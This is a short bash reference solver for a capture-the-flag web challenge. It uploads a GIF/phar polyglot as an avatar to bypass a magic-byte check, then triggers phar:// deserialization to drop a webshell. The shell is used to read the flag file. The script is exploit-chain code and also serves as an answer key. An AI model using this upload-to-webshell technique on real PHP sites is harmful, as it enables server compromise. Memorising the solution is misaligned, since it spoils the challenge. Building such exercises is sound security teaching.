#!/usr/bin/env bash
# 04 · phar-image reference solver
# Usage: ./solve.sh http://TARGET:PORT
set -euo pipefail
BASE="${1:?usage: solve.sh http://host:port}"
HERE="$(cd "$(dirname "$0")" && pwd)"

echo "[*] Step 1: build polyglot phar (GIF89a + POP chain metadata)..."
if command -v php >/dev/null 2>&1; then
  php -d phar.readonly=0 "${HERE}/build_phar.php"
else
  echo "    (no local php; building via docker php:7.4-cli)"
  docker run --rm -v "${HERE}":/s -w /s php:7.4-cli \
    php -d phar.readonly=0 build_phar.php
fi

echo "[*] Step 2: upload it as an avatar (passes the GIF magic-byte filter)..."
curl -s -F "avatar=@${HERE}/evil.gif;filename=evil.gif" "${BASE}/" >/dev/null

echo "[*] Step 3: trigger phar:// stat -> POP chain writes uploads/sh.php..."
curl -s -G "${BASE}/" --data-urlencode "check=phar://uploads/evil.gif/x.txt" >/dev/null

echo "[*] Step 4: use the dropped webshell to read the flag..."
curl -s -G "${BASE}/uploads/sh.php" --data-urlencode "c=cat /flag.txt" \
  | grep -oE 'SecurinetsENIT\{[^}]+\}' | head -n1
